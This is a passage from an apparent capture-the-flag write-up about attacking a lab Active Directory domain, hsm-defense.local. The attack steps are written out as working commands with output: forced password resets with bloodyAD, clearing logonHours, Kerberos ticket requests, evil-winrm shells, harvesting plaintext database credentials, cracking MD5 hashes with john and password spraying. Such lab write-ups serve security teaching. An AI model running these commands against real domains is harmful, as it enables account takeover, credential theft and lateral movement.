The graph below reveals a clear attack path starting from the computer `HELPDESK01`, which holds `WriteOwner` rights over the `SERVICEDESK` group. That group in turn possesses ForceChangePassword rights on three users (**Jason Caldwell, Ethan Mercer, and Luke Harrison**). `Luke Harrison` is a member of the `Account Administrators` group, so an attacker who compromises `HELPDESK01` can take ownership of `SERVICEDESK`, force a password reset on Luke Harrison, and escalate into Account Administrators privileges.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FPphnD6Ma06so8hcwnhAS%252FScreenshot%2520%283460%29.png%3Falt%3Dmedia%26token%3D96db42c1-5e99-4324-9627-ef33d5590fb1\&width=768\&dpr=3\&quality=100\&sign=b88030ec770f2cf12353698b64d295e1\&sv=3)

So `jason.caldwell` is temporarily a dead end — we need write access to that account's `logonHours` attribute to lift the restriction, and `HELPDESK01$`/`servicedesk` doesn't have that particular right over him. Back to BloodHound-style thinking: is there another account reachable from here with broader write access? The `servicedesk` group (or `HELPDESK01$` directly) also lets us reset the password for a second user, **`luke.harrison`**, so let's try that path instead:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ bloodyAD -k --host DC.hsm-defense.local -d hsm-defense.local -u 'HELPDESK01$' -p 'Password123' set password luke.harrison 'Password123!'  
[+] Password changed successfully!
```

This one isn't locked out by logon hours, so it authenticates cleanly:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ nxc smb -k DC.hsm-defense.local -u 'luke.harrison' -p 'Password123!' --shares
SMB         DC.hsm-defense.local 445    DC               [*]  x64 (name:DC) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC.hsm-defense.local 445    DC               [+] hsm-defense.local\luke.harrison:Password123! 
SMB         DC.hsm-defense.local 445    DC               [*] Enumerated shares
SMB         DC.hsm-defense.local 445    DC               Share           Permissions     Remark
SMB         DC.hsm-defense.local 445    DC               -----           -----------     ------
SMB         DC.hsm-defense.local 445    DC               ADMIN$                          Remote Admin
SMB         DC.hsm-defense.local 445    DC               C$                              Default share
SMB         DC.hsm-defense.local 445    DC               IPC$            READ            Remote IPC
SMB         DC.hsm-defense.local 445    DC               NETLOGON        READ            Logon server share 
SMB         DC.hsm-defense.local 445    DC               SYSVOL          READ            Logon server share 
```

With working creds for `luke.harrison`, the next logical move is to ask Active Directory directly: **what can this specific account write to?** `bloodyAD`'s `get writable` command walks the domain's ACLs from the caller's own perspective and lists every attribute they hold write access over — this is essentially doing, from the command line, exactly what we'd otherwise have to click through in BloodHound's "Outbound Object Control" panel for this principal.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ bloodyAD --host DC.hsm-defense.local -d hsm-defense.local -u luke.harrison -p 'Password123!' -k get writable --detail

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=hsm-defense,DC=local
url: WRITE
wWWHomePage: WRITE

distinguishedName: CN=Luke Harrison,CN=Users,DC=hsm-defense,DC=local
thumbnailPhoto: WRITE
pager: WRITE
mobile: WRITE
homePhone: WRITE
userSMIMECertificate: WRITE
msDS-ExternalDirectoryObjectId: WRITE
msDS-cloudExtensionAttribute20: WRITE
msDS-cloudExtensionAttribute19: WRITE
msDS-cloudExtensionAttribute18: WRITE
msDS-cloudExtensionAttribute17: WRITE
msDS-cloudExtensionAttribute16: WRITE
msDS-cloudExtensionAttribute15: WRITE
msDS-cloudExtensionAttribute14: WRITE
msDS-cloudExtensionAttribute13: WRITE
msDS-cloudExtensionAttribute12: WRITE
msDS-cloudExtensionAttribute11: WRITE
msDS-cloudExtensionAttribute10: WRITE
msDS-cloudExtensionAttribute9: WRITE
msDS-cloudExtensionAttribute8: WRITE
msDS-cloudExtensionAttribute7: WRITE
msDS-cloudExtensionAttribute6: WRITE
msDS-cloudExtensionAttribute5: WRITE
msDS-cloudExtensionAttribute4: WRITE
msDS-cloudExtensionAttribute3: WRITE
msDS-cloudExtensionAttribute2: WRITE
msDS-cloudExtensionAttribute1: WRITE
msDS-GeoCoordinatesLongitude: WRITE
msDS-GeoCoordinatesLatitude: WRITE
msDS-GeoCoordinatesAltitude: WRITE
msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE
msPKI-CredentialRoamingTokens: WRITE
msDS-FailedInteractiveLogonCountAtLastSuccessfulLogon: WRITE
msDS-FailedInteractiveLogonCount: WRITE
msDS-LastFailedInteractiveLogonTime: WRITE
msDS-LastSuccessfulInteractiveLogonTime: WRITE
msDS-SupportedEncryptionTypes: WRITE
msPKIAccountCredentials: WRITE
msPKIDPAPIMasterKeys: WRITE
msPKIRoamingTimeStamp: WRITE
mSMQDigests: WRITE
mSMQSignCertificates: WRITE
userSharedFolderOther: WRITE
userSharedFolder: WRITE
url: WRITE
otherIpPhone: WRITE
ipPhone: WRITE
assistant: WRITE
primaryInternationalISDNNumber: WRITE
primaryTelexNumber: WRITE
otherMobile: WRITE
otherFacsimileTelephoneNumber: WRITE
userCert: WRITE
homePostalAddress: WRITE
personalTitle: WRITE
wWWHomePage: WRITE
otherHomePhone: WRITE
streetAddress: WRITE
otherPager: WRITE
info: WRITE
otherTelephone: WRITE
userCertificate: WRITE
preferredDeliveryMethod: WRITE
registeredAddress: WRITE
internationalISDNNumber: WRITE
x121Address: WRITE
facsimileTelephoneNumber: WRITE
teletexTerminalIdentifier: WRITE
telexNumber: WRITE
telephoneNumber: WRITE
physicalDeliveryOfficeName: WRITE
postOfficeBox: WRITE
postalCode: WRITE
postalAddress: WRITE
street: WRITE
st: WRITE
l: WRITE
c: WRITE

distinguishedName: CN=jason.caldwell,CN=Users,DC=hsm-defense,DC=local
logonHours: WRITE

distinguishedName: DC=hsm-defense.local,CN=MicrosoftDNS,DC=DomainDnsZones,DC=hsm-defense,DC=local
dnsNode: CREATE_CHILD
dnsZoneScopeContainer: CREATE_CHILD

distinguishedName: DC=_msdcs.hsm-defense.local,CN=MicrosoftDNS,DC=ForestDnsZones,DC=hsm-defense,DC=local
dnsNode: CREATE_CHILD
dnsZoneScopeContainer: CREATE_CHILD
```

That's a long list (mostly `luke.harrison`'s own self-writable attributes, which is normal/expected — every user can edit things like their own phone number), but one entry buried in there is exactly what we're after:

```
distinguishedName: CN=jason.caldwell,CN=Users,DC=hsm-defense,DC=local
logonHours: WRITE
```

`luke.harrison` has explicit **write access to `jason.caldwell`'s `logonHours` attribute** — precisely the restriction that blocked us a moment ago. We overwrite it (passing no value clears the restriction, which Active Directory then interprets as "no restriction," i.e. logon permitted at any hour):

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ bloodyAD --host DC.hsm-defense.local -d hsm-defense.local -u luke.harrison -p 'Password123!' -k set object jason.caldwell logonHours
[!] Attribute encoding not supported for logonHours with bytes attribute type, using raw mode
[+] jason.caldwell's logonHours has been updated
```

With the logon-hours restriction cleared, `jason.caldwell`'s credentials — set earlier via the `HELPDESK01$` → `servicedesk` chain — now work without any Kerberos pre-auth error:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ nxc smb -k DC.hsm-defense.local -u 'jason.caldwell' -p 'Password123!' --shares
SMB         DC.hsm-defense.local 445    DC               [*]  x64 (name:DC) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC.hsm-defense.local 445    DC               [+] hsm-defense.local\jason.caldwell:Password123! 
SMB         DC.hsm-defense.local 445    DC               [*] Enumerated shares
SMB         DC.hsm-defense.local 445    DC               Share           Permissions     Remark
SMB         DC.hsm-defense.local 445    DC               -----           -----------     ------
SMB         DC.hsm-defense.local 445    DC               ADMIN$                          Remote Admin
SMB         DC.hsm-defense.local 445    DC               C$                              Default share
SMB         DC.hsm-defense.local 445    DC               IPC$            READ            Remote IPC
SMB         DC.hsm-defense.local 445    DC               NETLOGON        READ            Logon server share 
SMB         DC.hsm-defense.local 445    DC               SYSVOL          READ            Logon server share
```

### Phase 3: Foothold as jason.caldwell

With valid, unrestricted credentials for `jason.caldwell`, it's time to get an actual interactive session rather than just SMB share listings. Since NTLM is disabled domain-wide, we request a proper Kerberos TGT with Impacket first, rather than trying to authenticate with a raw username/password over WinRM:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ impacket-getTGT hsm-defense.local/jason.caldwell:'Password123!'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in jason.caldwell.ccache
                                                                                                                                                                                                                  
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ export KRB5CCNAME=jason.caldwell.ccache 
```

`impacket-getTGT` requests a Ticket Granting Ticket for `jason.caldwell` and saves it to a `.ccache` file on disk; exporting `KRB5CCNAME` to point at that file tells every subsequent Kerberos-aware tool (including `evil-winrm`, which supports Kerberos via the `-r`/realm flag) to automatically pick up and reuse this cached ticket instead of asking for a password again. With the ticket cached, we connect over WinRM:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ evil-winrm -i DC.hsm-defense.local -r hsm-defense.local
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jason.caldwell\Documents>
```

We land a shell as `jason.caldwell`. A quick privilege check confirms we're a completely ordinary, unprivileged domain user at this point — nothing special has been granted locally:

```powershell
*Evil-WinRM* PS C:\Users\jason.caldwell\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

With basic groundwork done, it's worth taking a look at what's actually running locally on this host before moving on — `netstat -ano` lists all listening/established TCP connections along with their owning process IDs.

```powershell
*Evil-WinRM* PS C:\Users\jason.caldwell\Documents> netstat -ano
```

The output (shown below) reveals a locally-bound service worth remembering for later: something is listening on **port 3306**, MySQL/MariaDB's default port, bound only to `127.0.0.1`. That's not visible from Nmap's earlier external scan (it's `localhost`-only), so this is genuinely new information we only get from *inside* the box.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F8Lm0BKpznHVptbueBNs8%252FScreenshot%2520%283473%29.png%3Falt%3Dmedia%26token%3D6630761f-451f-4e97-be19-90778ed7bf10\&width=768\&dpr=3\&quality=100\&sign=b40f4b4cd55b4485f0dfb579e7cafca8\&sv=3)

Following that lead, we go looking for the database software itself on disk:

```powershell
*Evil-WinRM* PS C:\Users\jason.caldwell\Documents> cd "C:\Program Files"
*Evil-WinRM* PS C:\Program Files> ls


    Directory: C:\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/15/2026  11:50 AM                Amazon
d-----        9/15/2018  12:28 AM                Common Files
d-----         3/7/2026   1:47 AM                internet explorer
d-----         3/4/2026  12:53 PM                LibreOffice
d-----         3/5/2026   8:38 AM                MariaDB 10.6
d-----         3/6/2026   4:13 PM                Mozilla Thunderbird
d-----         3/4/2026   9:59 AM                MSBuild
d-----         3/4/2026   9:18 AM                Oracle
d-----         3/7/2026  12:48 AM                PackageManagement
d-----         3/4/2026   9:59 AM                Reference Assemblies
d-r---         9/2/2026   9:28 AM                Windows Defender
d-----         8/1/2026  10:47 AM                Windows Defender Advanced Threat Protection
d-----        11/5/2022  12:03 PM                Windows Mail
d-----         3/7/2026   1:47 AM                Windows Media Player
d-----         3/7/2026   1:47 AM                Windows Multimedia Platform
d-----        9/15/2018  12:28 AM                windows nt
d-----         8/1/2026  10:47 AM                Windows Photo Viewer
d-----         3/7/2026   1:47 AM                Windows Portable Devices
d-----        9/15/2018  12:19 AM                Windows Security
d-----         3/7/2026  12:48 AM                WindowsPowerShell
```

Sure enough, **`MariaDB 10.6`** is installed under `Program Files`. Configuration files for database engines routinely contain plaintext credentials for convenience (dev/test environments especially), so the `.ini` config is worth reading immediately:

```powershell
*Evil-WinRM* PS C:\Program Files\MariaDB 10.6\data> cat my.ini
[mysqld]
datadir=C:/Program Files/MariaDB 10.6/data
port=3306
bind-address=127.0.0.1
innodb_buffer_pool_size=511M

[client]
port=3306
plugin-dir=C:\Program Files\MariaDB 10.6/lib/plugin

[internal_app]
database_host=127.0.0.1
database_user=root
database_password=pa$$w0rd12
```

Jackpot — the `[internal_app]` section embeds a **plaintext root database credential**: `root:pa$$w0rd12`. This is a common real-world finding too: internal "helper" applications are frequently configured with hard-coded database credentials sitting right next to the DB engine's own config. We use it to log in locally via the `mysql.exe` client bundled with the MariaDB install, and immediately list the available databases:

```powershell
*Evil-WinRM* PS C:\Program Files\MariaDB 10.6\data> & "C:\Program Files\MariaDB 10.6\bin\mysql.exe" -h 127.0.0.1 --protocol=tcp -u root -ppa$$w0rd12 -e "SHOW DATABASES;"
Database
hsm_defense
information_schema
mysql
new_employees
performance_schema
sys
```

Two database names stand out from the generic MySQL system schemas — `hsm_defense` (presumably application data specific to this lab) and, more interestingly, **`new_employees`**, which sounds exactly like the kind of staging table an HR/onboarding process would use to seed new Active Directory accounts with initial passwords. We dump it:

```powershell
*Evil-WinRM* PS C:\Users\jason.caldwell\Documents> & "C:\Program Files\MariaDB 10.6\bin\mysql.exe" -h 127.0.0.1 --protocol=tcp -u root -ppa$$w0rd12 -D new_employees -e "SELECT * FROM employees;"
id      username        password
1       aaron.pierce    d482a055616317f569cd1ab90325479e
2       nathan.reed     d482a055616317f569cd1ab90325479e
4       adam.brooks     f3a4f28a0aaf388c0ce16a6011acf511
```

Three rows come back, each with a **raw MD5 hash** instead of a plaintext password — `id 1` (`aaron.pierce`) and `id 2` (`nathan.reed`) share the *exact same hash*, meaning whatever process generated these test/onboarding accounts reused the same initial password for multiple new hires (a very realistic, very bad, real-world habit). `id 4` (`adam.brooks`) has a different hash. Since MD5 is fast and unsalted, cracking these offline is trivial with `john`:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ john hashes --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
//newpassword123 (?)     
1g 0:00:00:00 DONE (2026-09-24 05:00) 1.149g/s 16486Kp/s 16486Kc/s 32900KC/s  fuckyooh21..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

`john` recovers the password behind the duplicated hash: **`//newpassword123`** (the leading slashes are literally part of the password string — another realistic touch, since password-complexity filters often just check for "contains a special character" without caring which one). Since this hash was shared by two of the three rows, that single crack effectively gives us a candidate password for **both** `aaron.pierce` and `nathan.reed` in one shot.

Password reuse is one of the single biggest levers in Active Directory attacks, so the obvious next move is to check whether this newly-cracked password also works for *other* accounts on the domain — including the third hash we didn't crack, or entirely unrelated users who happen to share a password with the "new hire" batch. First we need a full list of domain usernames to spray against, which NetExec can dump straight from SAM/SMB enumeration:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ nxc smb -k DC.hsm-defense.local -u 'jason.caldwell' -p 'Password123!' --users-export users.txt    
SMB         DC.hsm-defense.local 445    DC               [*]  x64 (name:DC) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)                                                                                                             
SMB         DC.hsm-defense.local 445    DC               [+] hsm-defense.local\jason.caldwell:Password123! 
SMB         DC.hsm-defense.local 445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                                                                                                            
SMB         DC.hsm-defense.local 445    DC               Administrator                 2026-03-23 22:15:31 0       Built-in account for administering the computer/domain                                                                                   
SMB         DC.hsm-defense.local 445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain                                                                                 
SMB         DC.hsm-defense.local 445    DC               krbtgt                        2026-03-04 17:33:48 0       Key Distribution Center Service Account                                                                                                  
SMB         DC.hsm-defense.local 445    DC               kelly.johnson                 2026-03-04 18:42:43 0        
SMB         DC.hsm-defense.local 445    DC               luke.harrison                 2026-09-23 23:16:22 0        
SMB         DC.hsm-defense.local 445    DC               ethan.mercer                  2026-03-05 15:33:39 0        
SMB         DC.hsm-defense.local 445    DC               aaron.pierce                  2026-03-05 17:03:40 0        
SMB         DC.hsm-defense.local 445    DC               nathan.reed                   2026-07-01 19:22:10 0        
SMB         DC.hsm-defense.local 445    DC               caleb.turner                  2026-03-21 11:59:01 0        
SMB         DC.hsm-defense.local 445    DC               adam.brooks                   2026-03-05 17:03:41 0        
SMB         DC.hsm-defense.local 445    DC               oscar.mazerath                2026-03-23 21:26:42 0        
SMB         DC.hsm-defense.local 445    DC               evan.carter                   2026-03-05 17:22:17 0        
SMB         DC.hsm-defense.local 445    DC               dylan.foster                  2026-03-05 17:22:17 0        
SMB         DC.hsm-defense.local 445    DC               ryan.cole                     2026-03-05 17:22:18 0        
SMB         DC.hsm-defense.local 445    DC               svc_delegate                  2026-03-05 19:14:27 0        
SMB         DC.hsm-defense.local 445    DC               jason.caldwell                2026-09-23 23:13:46 0        
SMB         DC.hsm-defense.local 445    DC               james.carter                  2026-03-21 11:59:32 0        
SMB         DC.hsm-defense.local 445    DC               oliver.bennett                2026-03-21 11:59:32 0        
SMB         DC.hsm-defense.local 445    DC               ethan.hughes                  2026-03-21 11:59:32 0        
SMB         DC.hsm-defense.local 445    DC               lucas.turner                  2026-03-21 11:59:32 0        
SMB         DC.hsm-defense.local 445    DC               daniel.mitchell               2026-03-21 11:59:32 0        
SMB         DC.hsm-defense.local 445    DC               mason.bradley                 2026-03-21 13:20:41 0        
SMB         DC.hsm-defense.local 445    DC               logan.shepherd                2026-03-21 13:20:41 0        
SMB         DC.hsm-defense.local 445    DC               noah.prescott                 2026-03-21 13:20:41 0        
SMB         DC.hsm-defense.local 445    DC               aiden.fletcher                2026-03-21 13:20:41 0        
SMB         DC.hsm-defense.local 445    DC               connor.bishop                 2026-03-21 13:20:41 0        
SMB         DC.hsm-defense.local 445    DC               zachary.holden                2026-03-21 13:20:41 0        
SMB         DC.hsm-defense.local 445    DC               [*] Enumerated 27 local users: HSMDEFENSE
SMB         DC.hsm-defense.local 445    DC               [*] Writing 27 local users to users.txt
```

27 accounts recovered and written to `users.txt`. Now we spray the single cracked password against the entire list, using `--continue-on-success` so NetExec doesn't stop at the first hit, and filtering the output down to successful logins only:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ nxc smb -k DC.hsm-defense.local -u users.txt -p '//newpassword123' --continue-on-success | grep '\[+\]' 
SMB                      DC.hsm-defense.local 445    DC               [+] hsm-defense.local\aaron.pierce://newpassword123 
SMB                      DC.hsm-defense.local 445    DC               [+] hsm-defense.local\caleb.turner://newpassword123 
```

Two hits: **`aaron.pierce`** (expected, since we cracked their hash directly) and, more usefully, **`caleb.turner`** — an account that had nothing to do with the `new_employees` database at all, but happens to reuse the exact same password. This is the pivot that actually matters, since (as BloodHound will confirm shortly) `caleb.turner` sits in a much more interesting position in the domain than the disposable "new hire" accounts do. The screenshots below capture this spray and the account we'll be pivoting to.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FM0yQTdBRus4R361PFMLr%252FScreenshot%2520%283461%29.png%3Falt%3Dmedia%26token%3D7a681503-b3c2-42dd-9c29-7f4924ca3637\&width=768\&dpr=3\&quality=100\&sign=a3521019417beaedc985965d786f850c\&sv=3)

`Aaron Pierce’s` membership graph shows he belongs to the `NewEmployees` and `Domain Users` groups. Domain Users is nested under `Authenticated Users`, which itself is a member of Everyone, Pre-Windows 2000 Compatible Access, and the `Users` group. This is the standard nested membership chain that most domain users inherit and is useful for understanding default rights available to Authenticated Users or Everyone.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FY9FCE6NvyjF64ZIuLwMf%252FScreenshot%2520%283463%29.png%3Falt%3Dmedia%26token%3De55689ac-04e6-44ad-bcc2-2d02a10df157\&width=768\&dpr=3\&quality=100\&sign=3876677588dab21b70b837a315cd53e4\&sv=3)

`Caleb Turner` is a member of `IT OU Operators`, `NewEmployees`, `Domain Users`, and `Remote Management Users`. Through Domain Users he also inherits membership in `Authenticated Users` and the usual `Everyone` / `Pre-Windows 2000` / `Users` groups. The combination of `IT OU Operators` and `Remote Management Users` memberships makes this account particularly interesting for lateral movement and potential privilege escalation inside IT organizational units.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FH5WyBq7WPuqnCabA1O3O%252FScreenshot%2520%283464%29.png%3Falt%3Dmedia%26token%3D4cd44cc5-3050-4e13-bd07-6ca50084e069\&width=768\&dpr=3\&quality=100\&sign=513bf47b1f26c2f4fc68ca132e7ba69f\&sv=3)

The `IT OU Operators` group holds `GenericAll` (full control) rights over a large set of user accounts—including **Zachary Holden, Logan Shepherd, James Carter, Ethan Hughes, Daniel Mitchell, Mason Bradley, Noah Prescott, Connor Bishop,** and **Aiden Fletcher**—as well as three organizational units (**IT-Tier2, IT-Tier3,** and **IT-Tier4**). Any member of this group can fully control those users and the listed OUs, making IT OU Operators a high-value target for privilege escalation.

### Phase 4: Lateral Movement to caleb.turner

Same pattern as before: since NTLM is off, we mint a Kerberos TGT for `caleb.turner` first, then use it to authenticate over WinRM.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ impacket-getTGT hsm-defense.local/caleb.turner:'//newpassword123'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in caleb.turner.ccache
                                                                                                                              
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ export KRB5CCNAME=caleb.turner.ccache  
```

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ evil-winrm -i DC.hsm-defense.local -r hsm-defense.local
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                                            
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\caleb.turner\Documents>
```

We're in as `caleb.turner`. The first order of business on any new foothold is grabbing the user flag:

```powershell
*Evil-WinRM* PS C:\Users\caleb.turner\Desktop> cat user.txt

[REDACTED]


⠀⠀⠀⣠⣴⠶⠶⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣰⢟⡵⠿⣿⣷⡄⢻⡶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣼⢣⣿⣿⣶⣌⣙⡇⣸⠻⣎⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⠸⡍⠻⣿⣿⠟⣰⣇⠀⢄⠑⢈⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠘⢦⣈⣉⣉⣴⡞⠁⠀⠁⠐⢿⣾⣯⠻⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠉⠛⠯⣝⡻⠦⡄⠈⣢⣾⣿⡿⠀⠀⠙⢦⡀⢀⣀⣀⣀⣠⣤⣄⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⠓⠚⠛⠿⣿⣿⣥⡀⠀⠀⠀⠙⢯⣭⣤⣤⣤⣤⣤⣄⠀⣽⢉⠓⠦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣌⠒⢤⡠⣀⠀⢹⣿⡌⠈⠉⠋⡇⠀⡇⣸⠙⠓⠦⣍⣓⣦⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣦⣉⣂⣑⣶⡟⢡⠀⠀⢸⠁⢰⣃⣟⣄⣀⣀⣐⣻⡼⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣠⣿⣩⣿⣿⣏⣉⣭⣥⡤⣧⡶⠒⠛⠛⠛⠛⣿⡟⠿⠿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⠞⡩⡉⢁⠀⣼⣣⠟⠉⠁⠀⡀⠀⠀⣴⢋⣦⠎⢀⣠⡶⠛⣡⢿⡶⠦⣤⣈⡙⠻⢦⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣴⡧⠾⠿⣷⣿⣿⡿⢁⠎⣠⢀⣾⣀⣀⣞⣿⠭⢭⣭⢿⣿⣷⢾⣧⡾⠿⠷⢾⡯⣍⣳⡦⣌⡛⠦⣄⠀⠀
⠀⠀⠀⠀⠀⢨⣟⣋⣿⣏⣻⡿⢿⠋⠹⡉⢉⠉⠉⢏⢹⡿⡾⣶⣿⡾⣿⢷⣿⡏⣴⣿⣿⣦⢻⣶⣬⣹⣶⣿⡳⣌⢻⡆
⠀⠀⠀⠀⠀⠈⢯⡈⣏⣯⣆⢹⣼⣧⠀⡄⠀⢻⣆⠀⢀⢻⣄⣸⣹⣇⣸⣦⣿⡆⢿⣷⣾⡟⣸⠛⣿⣻⣿⣿⣿⣾⠻⣇
⠀⠀⠀⠀⠀⠀⠈⢿⣏⢉⣽⣉⠹⣌⣿⣻⣶⣾⣟⣻⣿⣿⣿⡿⣽⠀⣣⠹⡌⣿⣲⣬⡥⣾⣿⣿⣿⣿⣿⣿⣿⣿⡷⣿
⠀⠀⠀⠀⠀⠀⠀⠈⢿⡚⠛⢿⠓⠿⣏⢻⣿⣿⣿⣿⣿⣿⣿⣿⡞⠳⡗⣶⢿⡉⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢻⡞⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⠾⠦⠷⠤⠼⠿⠯⠭⠿⠿⠿⠿⠽⠿⠿⠶⠤⠧⠤⠿⠧⠤⠼⠧⠤⠼⠤⠼⠧⠤⠿⠋⠀⠀
```

Flag captured. Checking privileges again shows the same baseline, unprivileged set of rights as `jason.caldwell` had — so any further escalation from here has to come from **AD object permissions**, not local Windows privileges:

```powershell
*Evil-WinRM* PS C:\Users\caleb.turner\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

This is where we go back to BloodHound in earnest, this time specifically hunting for `caleb.turner`'s **outbound object control** — what ACL rights does this account (or a group it belongs to) hold over other objects in the domain? The screenshots below walk through that analysis, which points us toward a set of tiered IT-administration Organizational Units.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fk3PXgEgvwzIxJhORqghW%252FScreenshot%2520%283465%29.png%3Falt%3Dmedia%26token%3D25b1d60d-a9ab-4a3a-8b0f-e68c815f25b9\&width=768\&dpr=3\&quality=100\&sign=3401639b13e65d6af8c6ba9cc7b9fbab\&sv=3)

